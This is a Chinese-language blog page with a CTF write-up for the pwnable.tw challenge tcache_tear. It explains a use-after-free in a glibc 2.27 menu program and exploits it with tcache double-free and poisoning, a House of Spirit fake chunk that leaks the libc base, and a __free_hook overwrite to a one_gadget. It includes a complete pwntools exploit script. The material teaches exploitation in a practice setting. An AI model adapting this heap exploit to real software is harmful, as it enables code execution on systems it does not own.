@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="manifest" href="/images/site.webmanifest">
+  <link rel="shortcut icon" href="/images/favicon.ico">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>pwnable.tw tcache_tear | Y² 的博客</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="pwnable.tw tcache_tear" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="程序分析" />
+<meta property="og:description" content="程序分析" />
+<link rel="canonical" href="https://www.cameudis.com/2023/02/01/pwnable-tw-tcache-tear-writeup.html" />
+<meta property="og:url" content="https://www.cameudis.com/2023/02/01/pwnable-tw-tcache-tear-writeup.html" />
+<meta property="og:site_name" content="Y² 的博客" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-02-01T23:16:30+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="pwnable.tw tcache_tear" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-02-01T23:16:30+08:00","datePublished":"2023-02-01T23:16:30+08:00","description":"程序分析","headline":"pwnable.tw tcache_tear","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.cameudis.com/2023/02/01/pwnable-tw-tcache-tear-writeup.html"},"url":"https://www.cameudis.com/2023/02/01/pwnable-tw-tcache-tear-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="https://www.cameudis.com/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+</head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw tcache_tear</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2023-02-01T23:16:30+08:00" itemprop="datePublished">Feb 1, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h2 id="程序分析">程序分析</h2>
+
+<p>GLIBC 2.27 64bits，关闭了 PIE。
+菜单题，提供了 alloc、free、info、exit 四个功能。</p>
+
+<ol>
+  <li>通过 alloc，用户可以自由申请小于 0xff（不含 chunk header）大小的区块并向其中填入 size-0x16 个任意字符（奇怪的限制）。整个程序只有一个放指针的槽位，是一个全局符号，记为gptr。</li>
+  <li>通过 free，用户可以释放全局符号 gptr 指向的空间。但程序使用局部变量作了限制，程序最多只能 free 8 次。<strong>漏洞：free 完没有清空指针</strong></li>
+  <li>通过 info，用户可以用 write 打印全局符号 name 处的值。这个符号本没有名字，但程序一开始会让我们输入一个 name 存储在这个符号的位置，所以就叫他 name。</li>
+  <li>通过 exit，用户可以退出程序。</li>
+</ol>
+
+<p>程序没有什么自带的后门函数，orw 的三个函数都不齐。</p>
+
+<h2 id="思路">思路</h2>
+
+<p>结合分析可以看出，必须要泄露 libc 基址才能搞事情。所以需要在 2.27 的版本下，想办法绕过 tcache 让 chunk 进入 unsorted bin 来获取 libc 地址。
+程序的唯一打印功能是打印固定地址处的内容，所以还需要用 house of spirit 的思想在 name 处构造假区块。</p>
+
+<p>综上，攻击步骤有如下几步：</p>
+<ol>
+  <li>构造 fake chunk 头部</li>
+  <li>构造 fake chunk 尾部，保证通过 free 的检查</li>
+  <li>释放 fake chunk 进入 unsorted bin</li>
+  <li>使用 info 功能泄露 libc 基址</li>
+  <li>覆写 <code class="language-plaintext highlighter-rouge">__free_hook</code> 为 one_gadget</li>
+</ol>
+
+<h2 id="具体实现">具体实现</h2>
+
+<h3 id="构造-fake-chunk">构造 fake chunk</h3>
+
+<p>为了完成 House of Spirit 攻击，我们需要精心构造 fake chunk。
+首先，为了不被分进 fastbins，chunksize 需要&gt;=0x90，这里就使用 0x90。
+其次，为了不与别的 chunk 合并，首先低位的 chunk 通过 0x91 的 1 来解决；高位的 chunk 就需要再构造两个 fake chunk，如下图所示：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>├──────┬──────┤  │
+│      │0x21  │  │
+├──────┴──────┤ ─┼─ Name+0xb0
+│             │  │
+├──────┬──────┤  │
+│      │0x21  │  │
+├──────┴──────┤ ─┼─ Name+0x90
+│             │  │
+│             │  │ Fake Chunk
+│             │  │
+│             │  │ beyond fastbin
+│             │  │
+│             │  │
+│             │  │
+│             │  │
+│             │  │
+├──────┬──────┤  │
+│      │0x91  │  │
+├──────┴──────┤ ─┼─ Name
+</code></pre></div></div>
+
+<p>fake chunk 的头部可以程序开始的时候输入 Name 0x91 来完成。高位的两个 fake chunk 就需要使用 tcache dub 然后 poisoning 来完成了，代码如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># fake chunk header
+</span><span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="c1"># fake chunk tail
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x6020f0</span><span class="p">))</span> <span class="err"> </span> <span class="err"> </span> <span class="c1"># 0x602060 + 0x90
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="泄露-libc">泄露 libc</h3>
+
+<p>构造完了 fake chunk，我们需要通过释放它来达到目的。为此我们有两种方法：一种是覆写全局 gp 为 fake chunk 地址；另一种是 poisoning tcache 把 fake chunk 取出，这里我们随便地采用后者。</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># alloc fake chunk
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x602070</span><span class="p">))</span> <span class="err"> </span> <span class="err"> </span> <span class="c1"># 0x602060 + 0x10
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s">"I'm a fake chunk"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>然后就可以释放并泄露 libc 基址了：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># free fake chunk into unsorted bin
+</span><span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># leak libc's base address
+</span><span class="n">info</span><span class="p">()</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span><span class="o">-</span><span class="mh">0x3ebca0</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"libc :"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
+</code></pre></div></div>
+
+<h3 id="覆写-hook">覆写 hook</h3>
+
+<p>有了 libc 基址，再加上 tcache 的任意写能力，就可以把 hook 覆写为 one_gadget 来完成攻击。脚本如下：</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">]</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x4f322</span> <span class="c1"># 0x10a38c
+</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+<span class="n">free</span><span class="p">()</span>
+</code></pre></div></div>
+
+<h2 id="完整脚本">完整脚本</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
+<span class="c1"># context.log_level = 'debug'
+</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">,</span> <span class="s">'-h'</span><span class="p">]</span>
+
+<span class="n">filename</span> <span class="o">=</span> <span class="s">"./pwn"</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">filename</span><span class="p">])</span>
+<span class="c1"># io = remote("chall.pwnable.tw", 10207)
+</span><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
+
+<span class="n">libc_name</span> <span class="o">=</span> <span class="s">"./libc.so"</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">libc_name</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice :"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Size:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"Data:"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice :"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">info</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice :"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
+    
+<span class="k">def</span> <span class="nf">exit</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"choice :"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"4"</span><span class="p">)</span>
+
+<span class="c1"># --- stage 1 : leak libc_addr ---
+</span>
+<span class="c1"># fake chunk header
+</span><span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x8</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+
+<span class="c1"># fake chunk tail
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x6020f0</span><span class="p">))</span>     <span class="c1"># 0x602060 + 0x90
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x40</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span>
+
+<span class="c1"># alloc fake chunk
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x602070</span><span class="p">))</span>     <span class="c1"># 0x602060 + 0x10
+</span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="sa">b</span><span class="s">'haha'</span><span class="p">)</span>
+
+<span class="c1"># free fake chunk into unsorted bin
+</span><span class="n">free</span><span class="p">()</span>
+
+<span class="c1"># leak libc's base address
+</span><span class="n">info</span><span class="p">()</span>
+<span class="n">libc_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">+</span><span class="sa">b</span><span class="s">'</span><span class="se">\0\0</span><span class="s">'</span><span class="p">)</span><span class="o">-</span><span class="mh">0x3ebca0</span>
+<span class="n">success</span><span class="p">(</span><span class="s">"libc :"</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_addr</span><span class="p">))</span>
+
+<span class="c1"># --- stage 2 : overwrite hook ---
+</span>
+<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"__free_hook"</span><span class="p">]</span>
+<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_addr</span> <span class="o">+</span> <span class="mh">0x4f322</span> <span class="c1"># 0x10a38c
+</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="n">pack</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+<span class="c1"># --- stage 3 : pwn ---
+</span>
+<span class="n">free</span><span class="p">()</span>
+<span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+  </div>
+    
+      <b>本博客上与 pwnable.tw 相关的贴子：</b>
+      <ul>
+        
+        
+          <li><a href="/2023/10/24/pwnable-tw-BabyStack-writeup.html">pwnable.tw BabyStack</a></li>
+        
+          <li><a href="/2023/10/13/pwnable-tw-Starbound-writeup.html">pwnable.tw Starbound</a></li>
+        
+          <li><a href="/2023/05/07/pwnable-tw-seethefile-writeup.html">pwnable.tw seethefile</a></li>
+        
+          <li><a href="/2023/04/14/pwnable-tw-re-alloc.html">pwnable.tw Re-alloc</a></li>
+        
+          <li><a href="/2023/02/01/pwnable-tw-tcache-tear-writeup.html">pwnable.tw tcache_tear</a></li>
+        
+          <li><a href="/2022/09/08/pwnable-tw-applestore-writeup.html">pwnable.tw applestore</a></li>
+        
+          <li><a href="/2022/09/01/pwnable-tw-hacknote-writeup.html">pwnable.tw hacknote</a></li>
+        
+          <li><a href="/2022/08/07/pwnable-tw-silver-bullet-writeup.html">pwnable.tw silver_bullet</a></li>
+        
+          <li><a href="/2022/08/06/pwnable-tw-dubblesort-writeup.html">pwnable.tw dubblesort</a></li>
+        
+          <li><a href="/2022/08/04/pwnable-tw-3x17-writeup.html">pwnable.tw 3x17</a></li>
+        
+      </ul>
+    
+  
+
+  <div id="comments"></div>
+  <script>
+  new Valine({
+    el: "#comments",
+    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
+    app_key: "6VqGye1352LX381YQDTOaiXs",
+    placeholder: "El Psy Congroo",
+  });
+</script>
+
+
+  <a class="u-url" href="/2023/02/01/pwnable-tw-tcache-tear-writeup.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Y² 的博客</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>料峭春风吹酒醒，微冷，山头斜照却相迎。回首向来萧瑟处，归去，也无风雨也无晴。</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
